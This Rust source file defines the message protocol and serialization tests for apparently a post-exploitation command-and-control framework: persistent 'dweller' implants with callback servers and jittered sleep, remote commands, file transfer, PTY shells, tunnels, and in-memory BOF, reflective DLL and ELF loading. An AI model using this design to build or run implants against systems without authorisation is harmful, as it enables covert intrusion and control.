use crate::streaming::models::StreamMessage;
use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize, Debug, Clone, Default, PartialEq, Eq)]
pub enum InternetAccess {
    Confirmed,
    ServerReachable,
    RouteOnly,
    Unreachable,
    #[default]
    Unknown,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default, PartialEq, Eq)]
pub struct ConnectivityReport {
    #[serde(default)]
    pub internet_access: InternetAccess,
    #[serde(default)]
    pub default_route: bool,
    #[serde(default)]
    pub server_reachable: bool,
    #[serde(default)]
    pub checked_target: Option<String>,
    #[serde(default)]
    pub note: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct DwellerServerEndpoint {
    pub address: String,
    pub fingerprint: Option<String>,
    pub transport: String,
    #[serde(default)]
    pub sni: Option<String>,
    #[serde(default)]
    pub alpn: Vec<String>,
}

fn default_true() -> bool {
    true
}

fn default_dweller_sleep_seconds() -> u64 {
    60
}

fn default_dweller_jitter_percent() -> u8 {
    50
}

fn default_dweller_task_batch_size() -> usize {
    10
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct DwellerHibernationConfig {
    #[serde(default = "default_true")]
    pub enabled: bool,
    #[serde(default = "default_dweller_sleep_seconds")]
    pub sleep_seconds: u64,
    #[serde(default = "default_dweller_jitter_percent")]
    pub jitter_percent: u8,
    #[serde(default = "default_dweller_task_batch_size")]
    pub task_batch_size: usize,
}

impl Default for DwellerHibernationConfig {
    fn default() -> Self {
        Self {
            enabled: true,
            sleep_seconds: default_dweller_sleep_seconds(),
            jitter_percent: default_dweller_jitter_percent(),
            task_batch_size: default_dweller_task_batch_size(),
        }
    }
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct DwellerPathHop {
    pub agent_id: String,
    pub agent_name: String,
    pub address: String,
    pub cidr: Option<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone, Default)]
pub struct DwellerRuntimeConfig {
    #[serde(default)]
    pub callback_servers: Vec<DwellerServerEndpoint>,
    #[serde(default)]
    pub hibernation: DwellerHibernationConfig,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub enum DwellerTaskKind {
    Command {
        command: String,
    },
    StartTunnel {
        subnet: String,
        tun_name: String,
    },
    StopTunnel,
    PortalPortForward {
        local_port: u16,
        target_addr: String,
        auth_key: Option<String>,
    },
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub enum DwellerTaskStatus {
    Pending,
    Running,
    Completed,
    Failed,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct DwellerTaskResult {
    pub task_id: String,
    pub success: bool,
    pub output: String,
    pub error: Option<String>,
    pub finished_at: String,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq, Eq)]
pub struct DwellerTask {
    pub task_id: String,
    pub kind: DwellerTaskKind,
    pub status: DwellerTaskStatus,
    pub created_at: String,
    #[serde(default)]
    pub updated_at: Option<String>,
    #[serde(default)]
    pub attempts: u32,
    #[serde(default)]
    pub result: Option<DwellerTaskResult>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct NetworkInterface {
    pub name: String,
    pub addresses: Vec<String>,
    pub hardware_addr: String,
    pub mtu: u32,
    pub flags: Vec<String>,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum AgentKind {
    Generic,
    Dweller,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AgentInfo {
    pub name: String,
    pub hostname: String,
    pub os: String,
    pub arch: String,
    pub interfaces: Vec<NetworkInterface>,
    pub auth_key: Option<String>,
    pub kind: AgentKind,
    pub stable_id: Option<String>,
    pub listener_addr: Option<String>,
    pub listener_port: Option<u16>,
    #[serde(default)]
    pub connectivity: ConnectivityReport,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DwellerInstallRequest {
    pub dweller_id: String,
    pub dweller_name: String,
    pub listen_addr: String,
    pub listen_port: u16,
    pub auth_key: String,
    pub cert_pem: String,
    pub key_pem: String,
    pub install_path: String,
    pub config_dir: String,
    pub service_name: String,
    #[serde(default)]
    pub callback_servers: Vec<DwellerServerEndpoint>,
    #[serde(default)]
    pub parent_path: Vec<DwellerPathHop>,
    #[serde(default)]
    pub hibernation: DwellerHibernationConfig,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct DwellerInstallReceipt {
    pub dweller_id: String,
    pub dweller_name: String,
    pub hostname: String,
    pub os: String,
    pub arch: String,
    pub listen_addr: String,
    pub listen_port: u16,
    pub fingerprint: String,
    pub install_path: String,
    pub config_dir: String,
    pub service_name: String,
    #[serde(default)]
    pub callback_servers: Vec<DwellerServerEndpoint>,
    #[serde(default)]
    pub parent_path: Vec<DwellerPathHop>,
    #[serde(default)]
    pub hibernation: DwellerHibernationConfig,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum Message {
    /// Agent registration with network information
    AgentRegister(AgentInfo),
    /// Server acknowledges agent registration
    AgentAck,
    /// Server initiates an authenticated dweller session
    DwellerHello {
        auth_key: String,
    },
    /// Server updates a connected dweller's future callback server list
    ConfigureDweller {
        config: DwellerRuntimeConfig,
    },
    /// Dweller acknowledges callback server configuration
    ConfigureDwellerResponse {
        success: bool,
        message: String,
    },
    /// Hibernating dweller asks for queued tasks.
    DwellerPollTasks {
        dweller_id: String,
        max_tasks: usize,
    },
    /// Server returns queued tasks for a hibernating dweller.
    DwellerTasks {
        tasks: Vec<DwellerTask>,
    },
    /// Hibernating dweller returns task output.
    DwellerTaskResult {
        dweller_id: String,
        result: DwellerTaskResult,
    },
    /// Server requests to start tunnel for specific subnet
    StartTunnel {
        subnet: String,
        tun_name: String,
    },
    /// Agent acknowledges tunnel start
    TunnelStarted,
    /// Server requests to stop tunnel
    StopTunnel,
    /// Agent acknowledges tunnel stop
    TunnelStopped,
    /// Portal mode: Server requests port forwarding
    PortalPortForward {
        local_port: u16,
        target_addr: String,
        auth_key: Option<String>,
    },
    /// New reverse port forwarding messages
    ReversePortForwardSetup {
        connection_id: String,
        local_port: u16,
        target_host: String,
        target_port: u16,
    },
    StreamSetup {
        connection_id: String,
    },
    ReversePortForwardCleanup {
        connection_id: String,
    },
    /// Data packet for tunneling
    DataPacket(Vec<u8>),
    /// Ping/Pong for keepalive
    Ping,
    Pong,
    /// Command execution request
    CommandRequest {
        command: String,
    },
    /// Command execution response
    CommandResponse {
        output: String,
        error: Option<String>,
    },
    /// Upload a file to the agent host
    FileUpload {
        remote_path: String,
        content_b64: String,
    },
    /// File upload response
    FileUploadResponse {
        success: bool,
        message: String,
    },
    /// Install and persist a dweller listener on the remote host
    DropDweller {
        request: DwellerInstallRequest,
    },
    /// Result of a dweller installation request
    DropDwellerResponse {
        success: bool,
        message: String,
        receipt: Option<DwellerInstallReceipt>,
    },
    /// Download a file from the agent host
    FileDownloadRequest {
        remote_path: String,
    },
    /// File download response
    FileDownloadResponse {
        success: bool,
        message: String,
        remote_path: String,
        content_b64: Option<String>,
    },
    /// Start an interactive PTY shell session on the agent
    ShellSessionStart {
        session_id: String,
        cols: u16,
        rows: u16,
    },
    /// PTY shell session start acknowledgment
    ShellSessionStarted {
        session_id: String,
        success: bool,
        message: String,
    },
    /// Send input bytes to an active PTY shell session
    ShellSessionInput {
        session_id: String,
        data_b64: String,
    },
    /// PTY shell output bytes from the agent
    ShellSessionOutput {
        session_id: String,
        data_b64: String,
    },
    /// Resize an active PTY shell session
    ShellSessionResize {
        session_id: String,
        cols: u16,
        rows: u16,
    },
    /// Close an active PTY shell session
    ShellSessionClose {
        session_id: String,
    },
    /// BOF (Beacon Object File) execution request
    BofExecutionRequest {
        bof_data: Vec<u8>,
        args: Vec<u8>,
        entry_point: String,
    },
    /// BOF execution response
    BofExecutionResponse {
        output: String,
        error: Option<String>,
    },
    /// Reflective PE/DLL loading request
    ReflectiveLoadRequest {
        pe_data: Vec<u8>,
        args: String,
    },
    /// Reflective PE/DLL loading response
    ReflectiveLoadResponse {
        output: String,
        error: Option<String>,
    },
    /// Linux ELF in-memory execution request
    LinuxElfExecutionRequest {
        elf_data: Vec<u8>,
        args: String,
    },
    /// Linux ELF in-memory execution response
    LinuxElfExecutionResponse {
        output: String,
        error: Option<String>,
    },
    /// Streaming protocol messages
    Stream(StreamMessage),
}

impl Message {
    // Removed unused helper methods for streaming protocol
    // These methods were never used and added unnecessary complexity
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::streaming::models::{CloseReason, DataDirection, PortMapping};
    use serde_json::{json, Value};

    fn wire(message: &Message) -> Value {
        serde_json::to_value(message).unwrap()
    }

    fn round_trip(message: &Message) -> Message {
        serde_json::from_value(wire(message)).unwrap()
    }

    #[test]
    fn unit_variants_use_bare_string_tags() {
        // Older peers depend on these exact encodings.
        assert_eq!(wire(&Message::Ping), json!("Ping"));
        assert_eq!(wire(&Message::Pong), json!("Pong"));
        assert_eq!(wire(&Message::AgentAck), json!("AgentAck"));
        assert_eq!(wire(&Message::StopTunnel), json!("StopTunnel"));
        assert_eq!(wire(&Message::TunnelStarted), json!("TunnelStarted"));
        assert_eq!(wire(&Message::TunnelStopped), json!("TunnelStopped"));
    }

    #[test]
    fn struct_variants_are_externally_tagged() {
        assert_eq!(
            wire(&Message::CommandRequest {
                command: "id".into()
            }),
            json!({"CommandRequest": {"command": "id"}})
        );
        assert_eq!(
            wire(&Message::DwellerHello {
                auth_key: "k".into()
            }),
            json!({"DwellerHello": {"auth_key": "k"}})
        );
        assert_eq!(
            wire(&Message::StartTunnel {
                subnet: "10.0.0.0/24".into(),
                tun_name: "lab0".into()
            }),
            json!({"StartTunnel": {"subnet": "10.0.0.0/24", "tun_name": "lab0"}})
        );
    }

    #[test]
    fn agent_register_from_older_peer_defaults_connectivity() {
        let legacy = json!({"AgentRegister": {
            "name": "a", "hostname": "h", "os": "linux", "arch": "x86_64",
            "interfaces": [], "auth_key": null, "kind": "Generic",
            "stable_id": null, "listener_addr": null, "listener_port": null
        }});
        match serde_json::from_value::<Message>(legacy).unwrap() {
            Message::AgentRegister(info) => {
                assert_eq!(info.connectivity, ConnectivityReport::default());
                assert_eq!(info.connectivity.internet_access, InternetAccess::Unknown);
            }
            other => panic!("unexpected {other:?}"),
        }
    }

    #[test]
    fn hibernation_defaults_apply_to_missing_and_partial_fields() {
        let empty: DwellerHibernationConfig = serde_json::from_value(json!({})).unwrap();
        assert_eq!(empty, DwellerHibernationConfig::default());
        assert!(empty.enabled);
        assert_eq!(empty.sleep_seconds, 60);
        assert_eq!(empty.jitter_percent, 50);
        assert_eq!(empty.task_batch_size, 10);

        let partial: DwellerHibernationConfig =
            serde_json::from_value(json!({"enabled": false, "sleep_seconds": 5})).unwrap();
        assert!(!partial.enabled);
        assert_eq!(partial.sleep_seconds, 5);
        assert_eq!(partial.task_batch_size, 10);
    }

    #[test]
    fn callback_endpoint_and_runtime_config_tolerate_missing_optional_fields() {
        let endpoint: DwellerServerEndpoint = serde_json::from_value(json!({
            "address": "10.0.0.1:44344", "fingerprint": null, "transport": "quic"
        }))
        .unwrap();
        assert!(endpoint.sni.is_none());
        assert!(endpoint.alpn.is_empty());

        let runtime: DwellerRuntimeConfig = serde_json::from_value(json!({})).unwrap();
        assert!(runtime.callback_servers.is_empty());
        assert_eq!(runtime.hibernation, DwellerHibernationConfig::default());
    }

    #[test]
    fn dweller_task_round_trips_with_defaults() {
        let task: DwellerTask = serde_json::from_value(json!({
            "task_id": "t1",
            "kind": {"Command": {"command": "whoami"}},
            "status": "Pending",
            "created_at": "now"
        }))
        .unwrap();
        assert_eq!(task.attempts, 0);
        assert!(task.updated_at.is_none() && task.result.is_none());
        let encoded = serde_json::to_value(&task).unwrap();
        assert_eq!(
            serde_json::from_value::<DwellerTask>(encoded).unwrap(),
            task
        );

        let stop: DwellerTaskKind = serde_json::from_value(json!("StopTunnel")).unwrap();
        assert_eq!(stop, DwellerTaskKind::StopTunnel);
    }

    #[test]
    fn stream_messages_round_trip_including_binary_payload() {
        let id = uuid::Uuid::new_v4();
        let payload: Vec<u8> = (0..=255).collect();
        let messages = [
            Message::Stream(StreamMessage::Setup {
                connection_id: id,
                mapping: PortMapping {
                    local_port: 8080,
                    target_host: "[2001:db8::1]".into(),
                    target_port: 443,
                },
            }),
            Message::Stream(StreamMessage::Data {
                connection_id: id,
                payload: bytes::Bytes::from(payload.clone()),
                direction: DataDirection::ClientToTarget,
            }),
            Message::Stream(StreamMessage::Close {
                connection_id: id,
                reason: CloseReason::ProtocolError("reset".into()),
            }),
            Message::Stream(StreamMessage::SetupAck {
                connection_id: id,
                success: false,
                error_message: Some("refused".into()),
            }),
        ];
        for message in &messages {
            assert_eq!(wire(&round_trip(message)), wire(message));
        }
        match round_trip(&messages[1]) {
            Message::Stream(StreamMessage::Data { payload: got, .. }) => {
                assert_eq!(&got[..], &payload[..])
            }
            other => panic!("unexpected {other:?}"),
        }
    }

    #[test]
    fn unknown_variants_and_wrong_shapes_are_rejected() {
        for bad in [
            json!("NotAMessage"),
            json!({"CommandRequest": {}}),
            json!({"CommandRequest": {"command": 7}}),
            json!({"PortalPortForward": {"local_port": 70000, "target_addr": "x", "auth_key": null}}),
            json!(42),
            json!(null),
        ] {
            assert!(
                serde_json::from_value::<Message>(bad.clone()).is_err(),
                "{bad} should not decode"
            );
        }
    }

    #[test]
    fn every_control_message_survives_the_frame_codec() {
        use crate::framing::FrameCodec;
        let id = "s1".to_string();
        let messages = vec![
            Message::Ping,
            Message::ConfigureDweller {
                config: DwellerRuntimeConfig::default(),
            },
            Message::ConfigureDwellerResponse {
                success: true,
                message: "ok".into(),
            },
            Message::DwellerPollTasks {
                dweller_id: "d".into(),
                max_tasks: 3,
            },
            Message::DwellerTasks { tasks: vec![] },
            Message::PortalPortForward {
                local_port: 1,
                target_addr: "10.0.0.1:22".into(),
                auth_key: None,
            },
            Message::ReversePortForwardSetup {
                connection_id: "c".into(),
                local_port: 1,
                target_host: "h".into(),
                target_port: 2,
            },
            Message::DataPacket(vec![0, 10, 13, 255]),
            Message::CommandResponse {
                output: "line1\nline2\r\n\u{0}".into(),
                error: Some("e".into()),
            },
            Message::FileDownloadResponse {
                success: true,
                message: String::new(),
                remote_path: "/etc/hostname".into(),
                content_b64: Some("aGk=".into()),
            },
            Message::ShellSessionStart {
                session_id: id.clone(),
                cols: 80,
                rows: 24,
            },
            Message::ShellSessionInput {
                session_id: id.clone(),
                data_b64: "bHMK".into(),
            },
            Message::ShellSessionResize {
                session_id: id.clone(),
                cols: 200,
                rows: 50,
            },
            Message::ShellSessionClose { session_id: id },
            Message::BofExecutionRequest {
                bof_data: vec![1, 2, 3],
                args: vec![],
                entry_point: "go".into(),
            },
            Message::ReflectiveLoadRequest {
                pe_data: vec![b'M', b'Z'],
                args: "-x".into(),
            },
        ];
        for message in messages {
            let frame = FrameCodec::CONTROL.encode(&message).unwrap();
            assert_eq!(frame.iter().filter(|b| **b == b'\n').count(), 1);
            let decoded: Message = FrameCodec::CONTROL.decode(&frame).unwrap();
            assert_eq!(wire(&decoded), wire(&message));
        }
    }
}
